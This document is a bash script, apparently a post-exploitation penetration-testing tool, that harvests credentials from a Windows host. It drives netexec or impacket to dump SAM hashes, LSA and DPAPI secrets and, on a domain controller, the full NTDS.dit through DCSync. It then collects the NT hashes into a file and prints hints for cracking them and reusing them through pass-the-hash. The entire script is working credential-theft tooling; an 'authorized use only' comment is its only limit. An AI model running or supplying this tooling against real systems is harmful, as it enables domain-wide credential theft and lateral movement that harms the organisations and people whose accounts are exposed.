#!/usr/bin/env bash
#
# secretsdump.sh - harvest secrets from a host you have creds on
# -----------------------------------------------------------------------------
# Pulls every secret netexec/impacket will give you from a target:
#   1. Local SAM hashes (--sam) and LSA secrets (--lsa).
#   2. LSASS-cached logon (DPAPI/credman where supported, --dpapi).
#   3. If the target is a DC and you have rights: full NTDS.dit dump (--ntds)
#      i.e. DCSync of every domain hash (mode 1000 for crack.sh).
#   4. LSASS dump via the 'nanodump'/'lsassy' module when available.
# Output is organised; NT hashes are dropped in a crack-ready file.
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY: dumping credentials is post-exploitation - in-scope hosts
# only. NTDS dump = every domain credential; treat the output as crown jewels.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./secretsdump.sh -i <target> -u <user> (-p <pass> | -H <lm:nt>) [-d domain] \
#                    [--ntds] [--dpapi] [-o out]
#
# EXAMPLES:
#   ./secretsdump.sh -i 10.10.10.5 -u admin -p 'Pass123' -d corp.local
#   ./secretsdump.sh -i 10.10.10.10 -u da -H :nthash -d corp.local --ntds   # DC
#
# DEPENDENCIES: netexec (preferred) and/or impacket-secretsdump
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
c_step(){ printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }

TARGET="" USER="" PASS="" HASH="" DOMAIN="" NTDS="" DPAPI="" OUT=""
usage(){ sed -n '2,28p' "$0"; exit 1; }
while getopts "i:u:p:H:d:o:h-:" o; do case "$o" in
  i) TARGET=$OPTARG;; u) USER=$OPTARG;; p) PASS=$OPTARG;; H) HASH=$OPTARG;;
  d) DOMAIN=$OPTARG;; o) OUT=$OPTARG;;
  -) case "$OPTARG" in ntds) NTDS=1;; dpapi) DPAPI=1;; *) usage;; esac;;
  *) usage;;
esac; done
[ -z "$TARGET" ] || [ -z "$USER" ] && { c_err "need -i and -u"; usage; }
[ -z "$PASS" ] && [ -z "$HASH" ] && { c_err "need -p or -H"; usage; }

OUT=${OUT:-"./secrets_${TARGET}_$(date +%Y%m%d_%H%M%S)"}; mkdir -p "$OUT"; cd "$OUT"
NXC=""; for b in nxc netexec crackmapexec; do have "$b" && { NXC=$b; break; }; done
AUTH=( -u "$USER" ); [ -n "$HASH" ] && AUTH+=( -H "$HASH" ) || AUTH+=( -p "$PASS" )
[ -n "$DOMAIN" ] && AUTH+=( -d "$DOMAIN" )

if [ -n "$NXC" ]; then
  c_step "SAM + LSA"
  $NXC smb "$TARGET" "${AUTH[@]}" --sam 2>&1 | tee sam.txt || true
  $NXC smb "$TARGET" "${AUTH[@]}" --lsa 2>&1 | tee lsa.txt || true
  if [ -n "$DPAPI" ]; then c_step "DPAPI"; $NXC smb "$TARGET" "${AUTH[@]}" --dpapi 2>&1 | tee dpapi.txt || true; fi
  if [ -n "$NTDS" ]; then
    c_step "NTDS.dit (DCSync - DC only, needs replication rights)"
    $NXC smb "$TARGET" "${AUTH[@]}" --ntds 2>&1 | tee ntds.txt || c_warn "NTDS dump failed (not a DC / insufficient rights)"
  fi
else
  c_warn "netexec missing - falling back to impacket-secretsdump"
  SD=$(command -v secretsdump.py || command -v impacket-secretsdump || true)
  [ -z "$SD" ] && { c_err "no netexec and no impacket-secretsdump"; exit 1; }
  TGT="${DOMAIN:+$DOMAIN/}$USER"; PWPART="$PASS"; HOPT=()
  [ -n "$HASH" ] && { PWPART=""; HOPT=( -hashes "$HASH" ); }
  "$SD" "${HOPT[@]}" "$TGT:${PWPART}@$TARGET" 2>&1 | tee secretsdump_raw.txt || true
fi

c_step "Extract crack-ready NT hashes"
cat ./*.txt 2>/dev/null | grep -E ':[a-f0-9]{32}:::' | sort -u > nt_hashes.txt || true
if [ -s nt_hashes.txt ]; then
  c_ok "$(wc -l < nt_hashes.txt) NT hashes -> $(pwd)/nt_hashes.txt"
  c_info "Crack:   crack.sh $(pwd)/nt_hashes.txt -m 1000"
  c_info "Reuse:   pass-the-hash with validate.sh / netexec -H <nt>"
else
  c_warn "No NT hashes parsed (check the raw *.txt output)."
fi
c_ok "Output: $(pwd)"
